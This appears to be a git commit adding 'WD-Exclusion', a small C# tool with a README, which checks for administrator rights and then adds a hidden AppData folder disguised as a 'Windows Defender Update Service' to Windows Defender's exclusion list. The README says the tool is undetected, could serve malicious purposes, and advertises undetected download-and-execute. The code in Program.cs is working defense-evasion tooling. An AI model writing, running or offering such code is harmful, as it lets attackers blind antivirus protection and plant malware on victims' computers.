8a55f021401beb032392cbd3777036cbfc228538
joey-marien <joey.marien2000@gmail.com>
2019-12-02 15:13:38 +0100

    Added files

---
+++ README.md
@@ -0,0 +1,15 @@
+# WD-Exclusion
+
+This is a quick & dirty tool I made to add an exclusion path to Windows Defender.
+
+## Information
+
+When I was doing research on malware that disables anti-viruses I noticed that nobody just adds an exclusion for their executable.
+While this may be (and probably is) a dumb idea, it works!
+At the time of uploading this it is undetected and could be used for malicious purposes.
+
+### Options/features
+
+* Detect admin privileges
+* Add a specified folder to Windows Defender exclusions list
+* Possibility to download and execute a file undetected
---
+++ WD-Exclusion/Program.cs
@@ -0,0 +1,48 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+
+namespace WD_Exclusion
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            bool checkAdmin;
+
+            string exclusionpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows Defender Update Service\\";
+
+            Process compiler = new Process();
+            compiler.StartInfo.FileName = "powershell.exe";
+            compiler.StartInfo.Verb = "prunas";
+            compiler.StartInfo.Arguments = @"[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match 'S-1-5-32-544')";
+            compiler.StartInfo.UseShellExecute = false;
+            compiler.StartInfo.RedirectStandardOutput = true;
+            compiler.Start();
+            checkAdmin = bool.Parse(compiler.StandardOutput.ReadToEnd());
+            compiler.WaitForExit();
+
+            if (checkAdmin == true)
+            {
+                if (!Directory.Exists(exclusionpath))
+                {
+                    DirectoryInfo di = Directory.CreateDirectory(exclusionpath);
+                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                }
+                compiler.StartInfo.Arguments = @"Add-MpPreference -ExclusionPath '" + exclusionpath + "'";
+                compiler.Start();
+                Console.WriteLine("Exclusion path has been added.");
+            }
+            else if (checkAdmin == false)
+            {
+                Console.WriteLine("Error getting admin privileges.");
+            }
+            else
+            {
+                Console.WriteLine("An unkown error occurred.");
+            }
+            compiler.WaitForExit();
+            Console.ReadLine();
+        }
+    }
+}
